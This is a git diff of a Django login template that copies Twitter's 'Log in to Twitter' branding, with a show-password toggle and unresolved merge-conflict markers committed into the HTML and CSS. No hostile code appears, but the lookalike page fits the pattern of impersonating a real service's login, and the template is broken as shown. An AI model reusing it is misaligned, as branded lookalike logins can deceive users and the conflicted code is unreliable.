@@ -61,7 +61,7 @@ dir="ltr" onload="myFunction1()">
   <div id="page-container" class="AppContent wrapper wrapper-login">
     <div class="page-canvas">
       <div class="signin-wrapper" data-login-message="">
-        <h1>Log in to Twitter</h1>
+        <h1>Log In To Twitter</h1>
         <form method="post" class="t1-form clearfix signin js-signin">
           {% csrf_token %}
           {{ form.as_p }}
@@ -70,8 +70,13 @@ dir="ltr" onload="myFunction1()">
             <label class="t1-label remember">
               <input type="checkbox" value="0" name="remember_me" onclick="myFunction()">
               Show Password
+<<<<<<< HEAD
+              <!-- <span class="separator">·</span>
+              <a class="forgot" href="#" rel="noopener">Forgot password?</a> -->
+=======
               <span class="separator">·</span>
               
+>>>>>>> c23780c21d620240d733d35107e75dc0d79d052b
             </label>
           </div>
         </form>
@@ -111,7 +116,7 @@ dir="ltr" onload="myFunction1()">
 </body>
 {% endblock %}
 {% block scripts %}
-<script>
+<script >
 function myFunction() {
     var x = document.getElementById("id_password");
     if (x.type === "password") {
@@ -124,15 +129,22 @@ function myFunction1() {
     document.getElementById("id_username").placeholder = "please enter username";
     document.getElementById("id_password").placeholder = "please enter password";
 }
+
 </script>
 <style type="text/css">
   p{
     margin-bottom: 20px;
   }
+<<<<<<< HEAD
+
+
+
+=======
   ul{
     color: red;
     
   }
+>>>>>>> c23780c21d620240d733d35107e75dc0d79d052b
 </style>
 
 {% endblock %}
